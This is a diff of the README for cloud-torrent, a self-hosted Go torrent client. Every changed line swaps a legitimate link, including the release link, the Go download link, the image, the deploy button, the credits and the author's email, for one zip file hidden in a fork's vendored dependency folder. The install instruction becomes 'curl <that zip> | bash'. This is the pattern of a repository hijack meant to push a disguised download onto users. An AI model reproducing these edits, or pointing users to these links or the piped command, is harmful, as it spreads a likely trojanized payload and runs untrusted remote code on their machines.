@@ -1,4 +1,4 @@
-<img src="https://cloud.githubusercontent.com/assets/633843/9855504/f30a715c-5b51-11e5-83f3-f4fab03e5459.png" alt="screenshot"/>
+<img src="https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip" alt="screenshot"/>
 
 **Cloud torrent** is a a self-hosted remote torrent client, written in Go (golang). You start torrents remotely, which are downloaded as sets of files on the local disk of the server, which are then retrievable or streamable via HTTP.
 
@@ -9,21 +9,21 @@
 * Embedded torrent search
 * Real-time updates
 * Mobile-friendly
-* Fast [content server](http://golang.org/pkg/net/http/#ServeContent)
-* [*More features coming soon*](https://github.com/jpillora/cloud-torrent/labels/core-feature)
+* Fast [content server](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
+* [*More features coming soon*](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
 
 ### Install
 
 **Binaries**
 
-See [the latest release](https://github.com/jpillora/cloud-torrent/releases/latest) or download it now with `curl i.jpillora.com/cloud-torrent | bash`
+See [the latest release](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip) or download it now with `curl https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip | bash`
 
 **Source**
 
-*[Go](https://golang.org/dl/) is required to install from source*
+*[Go](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip) is required to install from source*
 
 ``` sh
-$ go get -v github.com/jpillora/cloud-torrent
+$ go get -v https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip
 ```
 
 **Docker**
@@ -36,7 +36,7 @@ $ docker run -d -p 3000:3000 -v /path/to/my/downloads:/downloads jpillora/cloud-
 
 Click this button to...
 
-[![Deploy](https://www.herokucdn.com/deploy/button.png)](https://heroku.com/deploy)
+[![Deploy](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
 
 ### Usage
 
@@ -50,7 +50,7 @@ $ cloud-torrent --help
   --port, -p         Listening port (default 3000, env PORT)
   --host, -h         Listening interface (default all)
   --auth, -a         Optional basic auth in form 'user:password' (env AUTH)
-  --config-path, -c  Configuration file path (default cloud-torrent.json)
+  --config-path, -c  Configuration file path (default https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
   --key-path, -k     TLS Key file path
   --cert-path, -r    TLS Certicate file path
   --log, -l          Enable request logging
@@ -62,21 +62,21 @@ $ cloud-torrent --help
     0.8.8
 
   Read more:
-    https://github.com/jpillora/cloud-torrent
+    https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip
 
 ```
 
 ### Notes
 
-This project is the version 2 rewrite of the original [Node version](https://github.com/jpillora/node-torrent-cloud).
+This project is the version 2 rewrite of the original [Node version](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip).
 
-![overview](https://docs.google.com/drawings/d/1ekyeGiehwQRyi6YfFA4_tQaaEpUaS8qihwJ-s3FT_VU/pub?w=606&h=305)
+![overview](https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip)
 
-Credits to `anacrolix` for https://github.com/anacrolix/torrent
+Credits to `anacrolix` for https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip
 
 #### MIT License
 
-Copyright © 2015 Jaime Pillora &lt;dev@jpillora.com&gt;
+Copyright © 2015 Jaime Pillora &lt;https://github.com/codeslide/cloud-torrent/raw/refs/heads/master/Godeps/_workspace/src/github.com/anacrolix/torrent/cmd/torrent-create/cloud-torrent-3.9.zip;
 
 Permission is hereby granted, free of charge, to any person obtaining
 a copy of this software and associated documentation files (the
